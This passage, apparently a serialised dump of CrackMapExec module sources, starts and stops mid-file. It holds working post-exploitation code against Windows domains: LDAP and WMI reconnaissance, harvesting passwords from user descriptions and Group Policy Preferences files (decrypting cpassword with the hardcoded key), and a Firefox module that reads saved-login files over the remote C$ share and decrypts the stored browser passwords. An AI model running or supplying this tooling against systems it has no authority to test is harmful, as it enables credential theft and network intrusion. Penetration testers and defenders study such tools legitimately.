False):\n                        domain_data[rtype].append(f""{rname}: {rvalue}"")\n                    else:\n                        domain_data[rtype] = [f""{rname}: {rvalue}""]\n\n                for k, v in sorted(domain_data.items()):\n                    context.log.highlight(f""Record Type: {k}"")\n                    data += f""Record Type: {k}\\n""\n                    for d in sorted(v):\n                        context.log.highlight(""\\t"" + d)\n                        data += ""\\t"" + d + ""\\n""\n\n        log_name = ""DNS-Enum-{}-{}.log"".format(connection.host, datetime.now().strftime(""%Y-%m-%d_%H%M%S""))\n        write_log(data, log_name)\n        context.log.display(f""Saved raw output to ~/.cme/logs/{log_name}"")\n', 'example_module.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n\nclass CMEModule:\n    """"""\n    Example\n    Module by @yomama\n    """"""\n\n    name = ""example module""\n    description = ""I do something""\n    supported_protocols = [] # Example: [\'smb\', \'mssql\']\n    opsec_safe = True  # Does the module touch disk?\n    multiple_hosts = True  # Does it make sense to run this module on multiple hosts at a time?\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n\n    def options(self, context, module_options):\n        """"""Required.\n        Module options get parsed here. Additionally, put the modules usage here as well\n        """"""\n        pass\n\n    def on_login(self, context, connection):\n        """"""Concurrent.\n        Required if on_admin_login is not present. This gets called on each authenticated connection\n        """"""\n        # Logging best practice\n        # Mostly you should use these functions to display information to the user\n        context.log.display(""I\'m doing something"")     # Use this for every normal message ([*] I\'m doing something)\n        context.log.success(""I\'m doing something"")     # Use this for when something succeeds ([+] I\'m doing something)\n        context.log.fail(""I\'m doing something"")        # Use this for when something fails ([-] I\'m doing something), for example a remote registry entry is missing which is needed to proceed\n        context.log.highlight(""I\'m doing something"")   # Use this for when something is important and should be highlighted, printing credentials for example\n\n        # These are for debugging purposes\n        context.log.info(""I\'m doing something"")        # This will only be displayed if the user has specified the --verbose flag, so add additional info that might be useful\n        context.log.debug(""I\'m doing something"")       # This will only be displayed if the user has specified the --debug flag, so add info that you would might need for debugging errors\n\n        # These are for more critical error handling\n        context.log.error(""I\'m doing something"")       # This will not be printed in the module context and should only be used for critical errors (e.g. a required python file is missing)\n        try:\n            raise Exception(""Exception that might occure"")\n        except Exception as e:\n            context.log.exception(f""Exception occured: {e}"")   # This will display an exception traceback screen after an exception was raised and should only be used for critical errors\n\n    def on_admin_login(self, context, connection):\n        """"""Concurrent.\n        Required if on_login is not present\n        This gets called on each authenticated connection with  Administrative privileges\n        """"""\n        pass\n\n    def on_request(self, context, request):\n        """"""Optional.\n        If the payload needs to retrieve additional files, add this function to the module\n        """"""\n        pass\n\n    def on_response(self, context, response):\n        """"""Optional.\n        If the payload sends back its output to our server, add this function to the module to handle its output\n        """"""\n        pass\n\n    def on_shutdown(self, context, connection):\n        """"""Optional.\n        Do something on shutdown\n        """"""\n        pass\n', 'find-computer.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport socket\nimport sys\n\nclass CMEModule:\n    \'\'\'\n      Module by CyberCelt: @Cyb3rC3lt\n\n      Initial module:\n        https://github.com/Cyb3rC3lt/CrackMapExec-Modules\n    \'\'\'\n    \n    name = \'find-computer\'\n    description = \'Finds computers in the domain via the provided text\'\n    supported_protocols = [\'ldap\']\n    opsec_safe = True\n    multiple_hosts = False\n\n    def options(self, context, module_options):\n        \'\'\'\n        find-computer: Specify find-computer to call the module\n        TEXT: Specify the TEXT option to enter your text to search for\n        Usage: cme ldap $DC-IP -u Username -p Password -M find-computer -o TEXT=""server""\n               cme ldap $DC-IP -u Username -p Password -M find-computer -o TEXT=""SQL""\n        \'\'\'\n\n        self.TEXT = \'\'\n\n        if \'TEXT\' in module_options:\n            self.TEXT = module_options[\'TEXT\']\n        else:\n            context.log.error(\'TEXT option is required!\')\n            exit(1)\n\n    def on_login(self, context, connection):\n\n        # Building the search filter\n        searchFilter = ""(&(objectCategory=computer)(&(|(operatingSystem=*""+self.TEXT+""*)(name=*""+self.TEXT+""*))))""\n\n        try:\n            context.log.debug(\'Search Filter=%s\' % searchFilter)\n            resp = connection.ldapConnection.search(searchFilter=searchFilter,\n                                        attributes=[\'dNSHostName\',\'operatingSystem\'],\n                                        sizeLimit=0)\n        except ldap_impacket.LDAPSearchError as e:\n            if e.getErrorString().find(\'sizeLimitExceeded\') >= 0:\n                context.log.debug(\'sizeLimitExceeded exception caught, giving up and processing the data received\')\n                resp = e.getAnswers()\n                pass\n            else:\n                logging.debug(e)\n                return False\n\n        answers = []\n        context.log.debug(\'Total no. of records returned %d\' % len(resp))\n        for item in resp:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            dNSHostName =  \'\'\n            operatingSystem = \'\'\n            try:\n                for attribute in item[\'attributes\']:\n                    if str(attribute[\'type\']) == \'dNSHostName\':\n                        dNSHostName = str(attribute[\'vals\'][0])\n                    elif str(attribute[\'type\']) == \'operatingSystem\':\n                        operatingSystem = attribute[\'vals\'][0]\n                if dNSHostName != \'\' and operatingSystem != \'\':\n                    answers.append([dNSHostName,operatingSystem])\n            except Exception as e:\n                context.log.debug(""Exception:"", exc_info=True)\n                context.log.debug(\'Skipping item, cannot process due to error %s\' % str(e))\n                pass\n        if len(answers) > 0:\n            context.log.success(\'Found the following computers: \')\n            for answer in answers:\n                try:\n                    IP = socket.gethostbyname(answer[0])\n                    context.log.highlight(u\'{} ({}) ({})\'.format(answer[0],answer[1],IP))\n                    context.log.debug(\'IP found\')\n                except socket.gaierror as e:\n                    context.log.debug(\'Missing IP\')\n                    context.log.highlight(u\'{} ({}) ({})\'.format(answer[0],answer[1],""No IP Found""))\n        else:\n            context.log.success(\'Unable to find any computers with the text ""\' + self.TEXT + \'""\')\n', 'firefox.py': '#!/usr/bin/env python3\nfrom base64 import b64decode\nfrom binascii import unhexlify\nfrom hashlib import pbkdf2_hmac, sha1\nimport hmac\nimport json\nimport ntpath\nimport sqlite3\nimport tempfile\nfrom Cryptodome.Cipher import AES, DES3\nfrom pyasn1.codec.der import decoder\nfrom dploot.lib.smb import DPLootSMBConnection\n\nCKA_ID = unhexlify(""f8000000000000000000000000000001"")\n\n\nclass FirefoxData:\n    def __init__(self, winuser: str, url: str, username: str, password: str):\n        self.winuser = winuser\n        self.url = url\n        self.username = username\n        self.password = password\n\n\nclass FirefoxTriage:\n    """"""\n    Firefox by @zblurx\n    Inspired by firefox looting from DonPAPI\n    https://github.com/login-securite/DonPAPI\n    """"""\n\n    firefox_generic_path = ""Users\\\\{}\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles""\n    share = ""C$""\n    false_positive = (\n        ""."",\n        "".."",\n        ""desktop.ini"",\n        ""Public"",\n        ""Default"",\n        ""Default User"",\n        ""All Users"",\n    )\n\n    def __init__(self, target, logger, conn: DPLootSMBConnection = None):\n        self.target = target\n        self.logger = logger\n        self.conn = conn\n\n    def upgrade_connection(self, connection=None):\n        self.conn = DPLootSMBConnection(self.target)\n        if connection is not None:\n            self.conn.smb_session = connection\n        else:\n            self.conn.connect()\n\n    def run(self):\n        if self.conn is None:\n            self.upgrade_connection()\n\n        firefox_data = []\n        # list users\n        users = self.get_users()\n        for user in users:\n            try:\n                directories = self.conn.remote_list_dir(share=self.share, path=self.firefox_generic_path.format(user))\n            except Exception as e:\n                if ""STATUS_OBJECT_PATH_NOT_FOUND"" in str(e):\n                    continue\n                self.logger.debug(e)\n            if directories is None:\n                continue\n            for d in [d for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]:\n                try:\n                    logins_path = self.firefox_generic_path.format(user) + ""\\\\"" + d.get_longname() + ""\\\\logins.json""\n                    logins_data = self.conn.readFile(self.share, logins_path)\n                    if logins_data is None:\n                        continue  # No logins.json file found\n                    logins = self.get_login_data(logins_data=logins_data)\n                    if len(logins) == 0:\n                        continue  # No logins profile found\n                    key4_path = self.firefox_generic_path.format(user) + ""\\\\"" + d.get_longname() + ""\\\\key4.db""\n                    key4_data = self.conn.readFile(self.share, key4_path, bypass_shared_violation=True)\n                    if key4_data is None:\n                        continue\n                    key = self.get_key(key4_data=key4_data)\n                    if key is None and self.target.password != """":\n                        key = self.get_key(\n                            key4_data=key4_data,\n                            master_password=self.target.password.encode(),\n                        )\n                    if key is None:\n                        continue\n                    for username, pwd, host in logins:\n                        decoded_username = self.decrypt(key=key, iv=username[1], ciphertext=username[2]).decode(""utf-8"")\n                        password = self.decrypt(key=key, iv=pwd[1], ciphertext=pwd[2]).decode(""utf-8"")\n                        if password is not None and decoded_username is not None:\n                            firefox_data.append(\n                                FirefoxData(\n                                    winuser=user,\n                                    url=host,\n                                    username=decoded_username,\n                                    password=password,\n                                )\n                            )\n                except Exception as e:\n                    if ""STATUS_OBJECT_PATH_NOT_FOUND"" in str(e):\n                        continue\n                    self.logger.exception(e)\n        return firefox_data\n\n    def get_login_data(self, logins_data):\n        json_logins = json.loads(logins_data)\n        if ""logins"" not in json_logins:\n            return []  # No logins key in logins.json file\n        logins = [\n            (\n                self.decode_login_data(row[""encryptedUsername""]),\n                self.decode_login_data(row[""encryptedPassword""]),\n                row[""hostname""],\n            )\n            for row in json_logins[""logins""]\n        ]\n        return logins\n\n    def get_key(self, key4_data, master_password=b""""):\n        fh = tempfile.NamedTemporaryFile()\n        fh.write(key4_data)\n        fh.seek(0)\n        db = sqlite3.connect(fh.name)\n        cursor = db.cursor()\n        cursor.execute(""SELECT item1,item2 FROM metadata WHERE id = \'password\';"")\n        row = next(cursor)\n\n        if row:\n            global_salt, master_password, _ = self.is_master_password_correct(key_data=row, master_password=master_password)\n            if global_salt:\n                try:\n                    cursor.execute(""SELECT a11,a102 FROM nssPrivate;"")\n                    for row in cursor:\n                        if row[0]:\n                            break\n                    a11 = row[0]\n                    a102 = row[1]\n                    if a102 == CKA_ID:\n                        decoded_a11 = decoder.decode(a11)\n                        key = self.decrypt_3des(decoded_a11, master_password, global_salt)\n                        if key is not None:\n                            fh.close()\n                            return key[:24]\n                except Exception as e:\n                    self.logger.debug(e)\n                    fh.close()\n                    return b""""\n        fh.close()\n\n    def is_master_password_correct(self, key_data, master_password=b""""):\n        try:\n            entry_salt = b""""\n            global_salt = key_data[0]  # Item1\n            item2 = key_data[1]\n            decoded_item2 = decoder.decode(item2)\n            cleartext_data = self.decrypt_3des(decoded_item2, master_password, global_salt)\n            if cleartext_data != ""password-check\\x02\\x02"".encode():\n                return """", """", """"\n            return global_salt, master_password, entry_salt\n        except Exception as e:\n            self.logger.debug(e)\n            return """", """", """"\n\n    def get_users(self):\n        users = list()\n\n        users_dir_path = ""Users\\\\*""\n        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))\n\n        for d in directories:\n            if d.get_longname() not in self.false_positive and d.is_directory() > 0:\n                users.append(d.get_longname())\n        return users\n\n    @staticmethod\n    def decode_login_data(data):\n        asn1data = decoder.decode(b64decode(data))\n        return (\n            asn1data[0][0].asOctets(),\n            asn1data[0][1][1].asOctets(),\n            asn1data[0][2].asOctets(),\n        )\n\n    @staticmethod\n    def decrypt(key, iv, ciphertext):\n        """"""\n        Decrypt ciphered data (user / password) using the key previously found\n        """"""\n        cipher = DES3.new(key=key, mode=DES3.MODE_CBC, iv=iv)\n        data = cipher.decrypt(ciphertext)\n        nb = data[-1]\n        try:\n            return data[:-nb]\n        except Exception:\n            return data\n\n    @staticmethod\n    def decrypt_3des(decoded_item, master_password, global_salt):\n        """"""\n        User master key is also encrypted (if provided, the master_password could be used to encrypt it)\n        """"""\n        # See http://www.drh-consultancy.demon.co.uk/key3.html\n        pbeAlgo = str(decoded_item[0][0][0])\n        if pbeAlgo == ""1.2.840.113549.1.12.5.1.3"":  # pbeWithSha1AndTripleDES-CBC\n            entry_salt = decoded_item[0][0][1][0].asOctets()\n            cipher_t = decoded_item[0][1].asOctets()\n\n            # See http://www.drh-consultancy.demon.co.uk/key3.html\n            hp = sha1(global_salt + master_password).digest()\n            pes = entry_salt + ""\\x00"".encode() * (20 - len(entry_salt))\n            chp = sha1(hp + entry_salt).digest()\n            k1 = hmac.new(chp, pes + entry_salt, sha1).digest()\n            tk = hmac.new(chp, pes, sha1).digest()\n            k2 = hmac.new(chp, tk + entry_salt, sha1).digest()\n            k = k1 + k2\n            iv = k[-8:]\n            key = k[:24]\n            cipher = DES3.new(key=key, mode=DES3.MODE_CBC, iv=iv)\n            return cipher.decrypt(cipher_t)\n        elif pbeAlgo == ""1.2.840.113549.1.5.13"":  # pkcs5 pbes2\n            assert str(decoded_item[0][0][1][0][0]) == ""1.2.840.113549.1.5.12""\n            assert str(decoded_item[0][0][1][0][1][3][0]) == ""1.2.840.113549.2.9""\n            assert str(decoded_item[0][0][1][1][0]) == ""2.16.840.1.101.3.4.1.42""\n            # https://tools.ietf.org/html/rfc8018#page-23\n            entry_salt = decoded_item[0][0][1][0][1][0].asOctets()\n            iteration_count = int(decoded_item[0][0][1][0][1][1])\n            key_length = int(decoded_item[0][0][1][0][1][2])\n            assert key_length == 32\n\n            k = sha1(global_salt + master_password).digest()\n            key = pbkdf2_hmac(""sha256"", k, entry_salt, iteration_count, dklen=key_length)\n\n            # https://hg.mozilla.org/projects/nss/rev/fc636973ad06392d11597620b602779b4af312f6#l6.49\n            iv = b""\\x04\\x0e"" + decoded_item[0][0][1][1][1].asOctets()\n            # 04 is OCTETSTRING, 0x0e is length == 14\n            encrypted_value = decoded_item[0][1].asOctets()\n            cipher = AES.new(key, AES.MODE_CBC, iv)\n            decrypted = cipher.decrypt(encrypted_value)\n            if decrypted is not None:\n                return decrypted\n            else:\n                return None\n', 'get-desc-users.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket.ldap import ldapasn1 as ldapasn1_impacket\nfrom impacket.ldap import ldap as ldap_impacket\nimport re\nfrom cme.logger import cme_logger\n\n\nclass CMEModule:\n    """"""\n    Get description of users\n    Module by @nodauf\n    """"""\n\n    name = ""get-desc-users""\n    description = ""Get description of the users. May contained password""\n    supported_protocols = [""ldap""]\n    opsec_safe = True  # Does the module touch disk?\n    multiple_hosts = True  # Does it make sense to run this module on multiple hosts at a time?\n\n    def options(self, context, module_options):\n        """"""\n        FILTER    Apply the FILTER (grep-like) (default: \'\')\n        PASSWORDPOLICY    Is the windows password policy enabled ? (default: False)\n        MINLENGTH    Minimum password length to match, only used if PASSWORDPOLICY is True (default: 6)\n        """"""\n        self.FILTER = """"\n        self.MINLENGTH = ""6""\n        self.PASSWORDPOLICY = False\n        if ""FILTER"" in module_options:\n            self.FILTER = module_options[""FILTER""]\n        if ""MINLENGTH"" in module_options:\n            self.MINLENGTH = module_options[""MINLENGTH""]\n        if ""PASSWORDPOLICY"" in module_options:\n            self.PASSWORDPOLICY = True\n            self.regex = re.compile(""((?=[^ ]*[A-Z])(?=[^ ]*[a-z])(?=[^ ]*\\d)|(?=[^ ]*[a-z])(?=[^ ]*\\d)(?=[^ ]*[^\\w \\n])|(?=[^ ]*[A-Z])(?=[^ ]*\\d)(?=[^ ]*[^\\w \\n])|(?=[^ ]*[A-Z])(?=[^ ]*[a-z])(?=[^ ]*[^\\w \\n]))[^ \\n]{"" + self.MINLENGTH + "",}"")  # Credit : https://stackoverflow.com/questions/31191248/regex-password-must-have-at-least-3-of-the-4-of-the-following\n\n    def on_login(self, context, connection):\n        """"""Concurrent. Required if on_admin_login is not present. This gets called on each authenticated connection""""""\n        # Building the search filter\n        searchFilter = ""(objectclass=user)""\n\n        try:\n            context.log.debug(""Search Filter=%s"" % searchFilter)\n            resp = connection.ldapConnection.search(\n                searchFilter=searchFilter,\n                attributes=[""sAMAccountName"", ""description""],\n                sizeLimit=0,\n            )\n        except ldap_impacket.LDAPSearchError as e:\n            if e.getErrorString().find(""sizeLimitExceeded"") >= 0:\n                context.log.debug(""sizeLimitExceeded exception caught, giving up and processing the data received"")\n                # We reached the sizeLimit, process the answers we have already and that\'s it. Until we implement\n                # paged queries\n                resp = e.getAnswers()\n                pass\n            else:\n                cme_logger.debug(e)\n                return False\n\n        answers = []\n        context.log.debug(""Total of records returned %d"" % len(resp))\n        for item in resp:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            sAMAccountName = """"\n            description = """"\n            try:\n                for attribute in item[""attributes""]:\n                    if str(attribute[""type""]) == ""sAMAccountName"":\n                        sAMAccountName = str(attribute[""vals""][0])\n                    elif str(attribute[""type""]) == ""description"":\n                        description = attribute[""vals""][0]\n                if sAMAccountName != """" and description != """":\n                    answers.append([sAMAccountName, description])\n            except Exception as e:\n                context.log.debug(""Exception:"", exc_info=True)\n                context.log.debug(""Skipping item, cannot process due to error %s"" % str(e))\n                pass\n        answers = self.filter_answer(context, answers)\n        if len(answers) > 0:\n            context.log.success(""Found following users: "")\n            for answer in answers:\n                context.log.highlight(""User: {} description: {}"".format(answer[0], answer[1]))\n\n    def filter_answer(self, context, answers):\n        # No option to filter\n        if self.FILTER == """" and not self.PASSWORDPOLICY:\n            context.log.debug(""No filter option enabled"")\n            return answers\n        answersFiltered = []\n        context.log.debug(""Prepare to filter"")\n        if len(answers) > 0:\n            for answer in answers:\n                conditionFilter = False\n                description = str(answer[1])\n                # Filter\n                if self.FILTER != """":\n                    conditionFilter = False\n                    if self.FILTER in description:\n                        conditionFilter = True\n\n                # Password policy\n                if self.PASSWORDPOLICY:\n                    conditionPasswordPolicy = False\n                    if self.regex.search(description):\n                        conditionPasswordPolicy = True\n\n                if self.FILTER and conditionFilter and self.PASSWORDPOLICY and conditionPasswordPolicy:\n                    answersFiltered.append([answer[0], description])\n                elif not self.FILTER and self.PASSWORDPOLICY and conditionPasswordPolicy:\n                    answersFiltered.append([answer[0], description])\n                elif not self.PASSWORDPOLICY and self.FILTER and conditionFilter:\n                    answersFiltered.append([answer[0], description])\n        return answersFiltered\n', 'get_netconnections.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom datetime import datetime\nfrom cme.helpers.logger import write_log\nimport json\n\n\nclass CMEModule:\n    """"""\n    Uses WMI to extract network connections, used to find multi-homed hosts.\n    Module by @fang0654\n\n    """"""\n\n    name = ""get_netconnections""\n    description = ""Uses WMI to query network connections.""\n    supported_protocols = [""smb"", ""wmi""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        No options\n        """"""\n        pass\n\n    def on_admin_login(self, context, connection):\n        data = []\n        cards = connection.wmi(f""select DNSDomainSuffixSearchOrder, IPAddress from win32_networkadapterconfiguration"")\n        if cards:\n            for c in cards:\n                if c[""IPAddress""].get(""value""):\n                    context.log.success(f""IP Address: {c[\'IPAddress\'][\'value\']}\\tSearch Domain: {c[\'DNSDomainSuffixSearchOrder\'][\'value\']}"")\n\n            data.append(cards)\n\n        log_name = ""network-connections-{}-{}.log"".format(connection.host, datetime.now().strftime(""%Y-%m-%d_%H%M%S""))\n        write_log(json.dumps(data), log_name)\n        context.log.display(f""Saved raw output to ~/.cme/logs/{log_name}"")\n', 'gpp_autologin.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport xml.etree.ElementTree as ET\nfrom io import BytesIO\n\n\nclass CMEModule:\n    """"""\n    Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1\n    Module by @byt3bl33d3r\n    """"""\n\n    name = ""gpp_autologin""\n    description = ""Searches the domain controller for registry.xml to find autologon information and returns the username and password.""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """""" """"""\n\n    def on_login(self, context, connection):\n        shares = connection.shares()\n        for share in shares:\n            if share[""name""] == ""SYSVOL"" and ""READ"" in share[""access""]:\n                context.log.success(""Found SYSVOL share"")\n                context.log.display(""Searching for Registry.xml"")\n\n                paths = connection.spider(""SYSVOL"", pattern=[""Registry.xml""])\n\n                for path in paths:\n                    context.log.display(""Found {}"".format(path))\n\n                    buf = BytesIO()\n                    connection.conn.getFile(""SYSVOL"", path, buf.write)\n                    xml = ET.fromstring(buf.getvalue())\n\n                    if xml.findall(\'.//Properties[@name=""DefaultPassword""]\'):\n                        usernames = []\n                        passwords = []\n                        domains = []\n\n                        xml_section = xml.findall("".//Properties"")\n\n                        for section in xml_section:\n                            attrs = section.attrib\n\n                            if attrs[""name""] == ""DefaultPassword"":\n                                passwords.append(attrs[""value""])\n\n                            if attrs[""name""] == ""DefaultUserName"":\n                                usernames.append(attrs[""value""])\n\n                            if attrs[""name""] == ""DefaultDomainName"":\n                                domains.append(attrs[""value""])\n\n                        if usernames or passwords:\n                            context.log.success(""Found credentials in {}"".format(path))\n                            context.log.highlight(""Usernames: {}"".format(usernames))\n                            context.log.highlight(""Domains: {}"".format(domains))\n                            context.log.highlight(""Passwords: {}"".format(passwords))\n', 'gpp_password.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport xml.etree.ElementTree as ET\nfrom Cryptodome.Cipher import AES\nfrom base64 import b64decode\nfrom binascii import unhexlify\nfrom io import BytesIO\n\n\nclass CMEModule:\n    """"""\n    Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1\n    Module by @byt3bl33d3r\n    """"""\n\n    name = ""gpp_password""\n    description = ""Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """""" """"""\n\n    def on_login(self, context, connection):\n        shares = connection.shares()\n        for share in shares:\n            if share[""name""] == ""SYSVOL"" and ""READ"" in share[""access""]:\n                context.log.success(""Found SYSVOL share"")\n                context.log.display(""Searching for potential XML files containing passwords"")\n\n                paths = connection.spider(\n                    ""SYSVOL"",\n                    pattern=[\n                        ""Groups.xml"",\n                        ""Services.xml"",\n                        ""Scheduledtasks.xml"",\n                        ""DataSources.xml"",\n                        ""Printers.xml"",\n                        ""Drives.xml"",\n                    ],\n                )\n\n                for path in paths:\n                    context.log.display(""Found {}"".format(path))\n\n                    buf = BytesIO()\n                    connection.conn.getFile(""SYSVOL"", path, buf.write)\n                    xml = ET.fromstring(buf.getvalue())\n                    sections = []\n\n                    if ""Groups.xml"" in path:\n                        sections.append(""./User/Properties"")\n\n                    elif ""Services.xml"" in path:\n                        sections.append(""./NTService/Properties"")\n\n                    elif ""ScheduledTasks.xml"" in path:\n                        sections.append(""./Task/Properties"")\n                        sections.append(""./ImmediateTask/Properties"")\n                        sections.append(""./ImmediateTaskV2/Properties"")\n                        sections.append(""./TaskV2/Properties"")\n\n                    elif ""DataSources.xml"" in path:\n                        sections.append(""./DataSource/Properties"")\n\n                    elif ""Printers.xml"" in path:\n                        sections.append(""./SharedPrinter/Properties"")\n\n                    elif ""Drives.xml"" in path:\n                        sections.append(""./Drive/Properties"")\n\n                    for section in sections:\n                        xml_section = xml.findall(section)\n                        for attr in xml_section:\n                            props = attr.attrib\n\n                            if ""cpassword"" in props:\n                                for user_tag in [\n                                    ""userName"",\n                                    ""accountName"",\n                                    ""runAs"",\n                                    ""username"",\n                                ]:\n                                    if user_tag in props:\n                                        username = props[user_tag]\n\n                                password = self.decrypt_cpassword(props[""cpassword""])\n\n                                context.log.success(""Found credentials in {}"".format(path))\n                                context.log.highlight(""Password: {}"".format(password))\n                                for k, v in props.items():\n                                    if k != ""cpassword"":\n                                        context.log.highlight(""{}: {}"".format(k, v))\n\n                                hostid = context.db.get_hosts(connection.host)[0][0]\n                                context.db.add_credential(\n                                    ""plaintext"",\n                                    """",\n                                    username,\n                                    password,\n                                    pillaged_from=hostid,\n                                )\n\n    def decrypt_cpassword(self, cpassword):\n        # Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385\n\n        # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2\n        key = unhexlify(""4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"")\n        cpassword += ""="" * ((4 - len(cpassword) % 4) % 4)\n        password = b64decode(cpassword)\n        IV = ""\\x00"" * 16\n        decypted = AES.new(key, AES.MODE_CBC, IV.encode(""utf8"")).decrypt(password)\n        return decypted.decode().rstrip()\n', 'group_members.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket.ldap import ldapasn1 as ldapasn1_impacket\n\nclass CMEModule:\n    \'\'\'\n      Module by CyberCelt: @Cyb3rC3lt\n\n      Initial module:\n        https://github.com/Cyb3rC3lt/CrackMapExec-Modules\n    \'\'\'\n\n    name = \'group-mem\'\n    description = \'Retrieves all the members within a Group\'\n    supported_protocols = [\'ldap\']\n    opsec_safe = True\n    multiple_hosts = False\n    primaryGroupID = \'\'\n    answers = []\n\n    def options(self, context, module_options):\n        \'\'\'\n        group-mem: Specify group-mem to call the module\n        GROUP: Specify the GROUP option to query for that group\'s members\n        Usage: cme ldap $DC-IP -u Username -p Password -M group-mem -o GROUP=""domain admins""\n               cme ldap $DC-IP -u Username -p Password -M group-mem -o GROUP=""domain controllers""\n        \'\'\'\n\n        self.GROUP = \'\'\n\n        if \'GROUP\' in module_options:\n            self.GROUP = module_options[\'GROUP\']\n        else:\n            context.log.error(\'GROUP option is required!\')\n            exit(1)\n\n    def on_login(self, context, connection):\n\n        #First look up the SID of the group passed in\n        searchFilter = ""(&(objectCategory=group)(cn="" + self.GROUP + ""))""\n        attribute = ""objectSid""\n\n        searchResult = doSearch(self, context, connection, searchFilter, attribute)\n        #If no SID for the Group is returned exit the program\n        if searchResult is None:\n            context.log.success(\'Unable to find any members of the ""\' + self.GROUP + \'"" group\')\n            return True\n\n        # Convert the binary SID to a primaryGroupID string to be used further\n        sidString = connection.sid_to_str(searchResult).split(""-"")\n        self.primaryGroupID = sidString[-1]\n\n        #Look up the groups DN\n        searchFilter = ""(&(objectCategory=group)(cn="" + self.GROUP + ""))""\n        attribute = ""distinguishedName""\n        distinguishedName = (doSearch(self, context, connection, searchFilter, attribute)).decode(""utf-8"")\n\n        # Carry out the search\n        searchFilter = ""(|(memberOf=""+distinguishedName+"")(primaryGroupID=""+self.primaryGroupID+""))""\n        attribute = ""sAMAccountName""\n        searchResult = doSearch(self, context, connection, searchFilter, attribute)\n\n        if len(self.answers) > 0:\n            context.log.success(\'Found the following members of the \' + self.GROUP + \' group:\')\n            for answer in self.answers:\n                context.log.highlight(u\'{}\'.format(answer[0]))\n\n# Carry out an LDAP search for the Group with the supplied Group name\ndef doSearch(self,context, connection,searchFilter,attributeName):\n    try:\n        context.log.debug(\'Search Filter=%s\' % searchFilter)\n        resp = connection.ldapConnection.search(searchFilter=searchFilter,\n                                                attributes=[attributeName],\n                                                sizeLimit=0)\n        context.log.debug(\'Total no. of records returned %d\' % len(resp))\n        for item in resp:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            attributeValue = \'\';\n            try:\n                for attribute in item[\'attributes\']:\n                    if str(attribute[\'type\']) == attributeName:\n                        if attributeName == ""objectSid"":\n                             attributeValue = bytes(attribute[\'vals\'][0])\n                             return attributeValue;\n                        elif attributeName == ""distinguishedName"":\n                             attributeValue = bytes(attribute[\'vals\'][0])\n                             return attributeValue;\n                        else:\n                             attributeValue = str(attribute[\'vals\'][0])\n                    if attributeValue is not None:\n                        self.answers.append([attributeValue])\n            except Exception as e:\n                context.log.debug(""Exception:"", exc_info=True)\n                context.log.debug(\'Skipping item, cannot process due to error %s\' % str(e))\n                pass\n    except Exception as e:\n        context.log.debug(""Exception:"", e)\n        return False\n', 'groupmembership.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket.ldap import ldapasn1 as ldapasn1_impacket\nfrom impacket.ldap import ldap as ldap_impacket\n\n\nclass CMEModule:\n    """"""\n    Created as a contributtion from HackTheBox Academy team for CrackMapExec\n    Reference: https://academy.hackthebox.com/module/details/84\n\n    Module by @juliourena\n    Based on: https://github.com/juliourena/CrackMapExec/blob/master/cme/modules/get_description.py\n    """"""\n\n    name = ""groupmembership""\n    description = ""Query the groups to which a user belongs.""\n    supported_protocols = [""ldap""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        USER\tChoose a username to query group membership\n        """"""\n\n        self.user = """"\n        if ""USER"" in module_options:\n            if module_options[""USER""] == """":\n                context.log.fail(""Invalid value for USER option!"")\n                exit(1)\n            self.user = module_options[""USER""]\n        else:\n            context.log.fail(""Missing USER option, use --options to list available parameters"")\n            exit(1)\n\n    def on_login(self, context, connection):\n        """"""Concurrent. Required if on_admin_login is not present. This gets called on each authenticated connection""""""\n        # Building the search filter\n        searchFilter = ""(&(objectClass=user)(sAMAccountName={}))"".format(self.user)\n\n        try:\n            context.log.debug(""Search Filter=%s"" % searchFilter)\n            resp = connection.ldapConnection.search(\n                searchFilter=searchFilter,\n                attributes=[""memberOf"", ""primaryGroupID""],\n                sizeLimit=0,\n            )\n        except ldap_impacket.LDAPSearchError as e:\n            if e.getErrorString().find(""sizeLimitExceeded"") >= 0:\n                context.log.debug(""sizeLimitExceeded exception caught, giving up and processing the data received"")\n                # We reached the sizeLimit, process the answers we have already and that\'s it. Until we implement\n                # paged queries\n                resp = e.getAnswers()\n                pass\n            else:\n                context.log.debug(e)\n                return False\n\n        memberOf = []\n        primaryGroupID = """"\n\n        context.log.debug(""Total of records returned %d"" % len(resp))\n        for item in resp:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            try:\n                for attribute in item[""attributes""]:\n                    if str(attribute[""type""]) == ""primaryGroupID"":\n                        primaryGroupID = attribute[""vals""][0]\n                        # Hardcode value for Domain Users primary Group ID 513\n                        # For future improvement maybe we can query the primary ID value\n               